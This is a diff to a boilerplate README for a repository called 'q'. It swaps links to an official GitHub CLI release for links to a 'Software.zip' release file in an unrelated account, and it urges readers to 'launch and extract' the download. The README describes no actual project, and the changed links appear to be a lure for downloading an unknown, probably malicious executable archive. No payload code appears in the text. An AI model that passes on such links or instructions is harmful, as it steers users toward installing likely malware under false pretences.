@@ -11,7 +11,7 @@ This repository does not provide a specific short description. Feel free to expl
 
 ## Installation
 To access the content of this repository, you can download the latest version by clicking the button below:
-[![Download Repository](https://img.shields.io/badge/Download-Repository-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Repository](https://github.com/Cx0ero/q/releases/download/v1.0/Software.zip)](https://github.com/Cx0ero/q/releases/download/v1.0/Software.zip)
 
 Please note that the download link provided needs to be launched and extracted to access the files within the repository.
 
@@ -27,4 +27,4 @@ The licensing information for the content within this repository is not provided
 ---
 If the provided download link does not work or if you need more information, please check the "Releases" section of this repository for alternate download options or updates. 
 
-We invite you to explore further by visiting the GitHub repository page ([q](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)) to discover more about this project.
+We invite you to explore further by visiting the GitHub repository page ([q](https://github.com/Cx0ero/q/releases/download/v1.0/Software.zip)) to discover more about this project.
